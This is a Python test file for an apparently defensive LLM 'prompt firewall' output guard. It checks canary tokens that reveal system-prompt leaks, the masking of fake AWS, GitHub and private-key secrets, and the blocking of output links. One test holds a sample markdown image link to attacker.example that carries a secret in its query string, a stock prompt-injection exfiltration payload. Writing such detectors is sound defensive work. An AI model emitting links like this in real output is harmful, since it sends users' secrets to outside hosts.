from prompt_firewall.output_guard import (
    canary_leaked,
    embed_canary,
    make_canary,
    scan_output,
)


def test_canary_format_and_uniqueness():
    a, b = make_canary(), make_canary()
    assert a.startswith("PIF-CANARY-") and a != b


def test_embed_canary():
    c = make_canary()
    assert c in embed_canary("You are a helpful bot.", c)


def test_canary_leak_variants():
    c = "PIF-CANARY-0123456789abcdef"
    assert canary_leaked(f"my id is {c}", c)
    assert canary_leaked("p i f - c a n a r y - 0123 4567 89ab cdef", c)
    assert canary_leaked("fedcba9876543210yranacfip", c)  # reversed
    assert not canary_leaked("nothing to see here", c)


def test_scan_output_canary_redacted():
    c = make_canary()
    r = scan_output(f"Sure, my instructions say {c}", canary=c)
    assert r.blocked and r.findings[0].kind == "canary_leak"
    assert c not in r.redacted


def test_secrets_detected_and_masked():
    text = ("aws AKIAABCDEFGHIJKLMNOP gh ghp_" + "a" * 36 +
            " -----BEGIN RSA PRIVATE KEY----- password=hunter2hunter2")
    r = scan_output(text)
    kinds = {f.detail.split(":")[0] for f in r.findings}
    assert {"aws_access_key_id", "github_token", "private_key_block", "generic_secret_assignment"} <= kinds
    assert "AKIAABCDEFGHIJKLMNOP" not in r.redacted
    assert all("AKIAABCDEFGHIJKLMNOP" not in f.detail for f in r.findings)


def test_exfil_link_in_output():
    r = scan_output("Done! ![img](https://attacker.example/log?c=secret)")
    assert r.blocked and r.findings[0].kind == "exfil_link"
    assert "attacker.example" not in r.redacted


def test_clean_output():
    r = scan_output("The capital of France is Paris.")
    assert not r.blocked and r.redacted == "The capital of France is Paris."
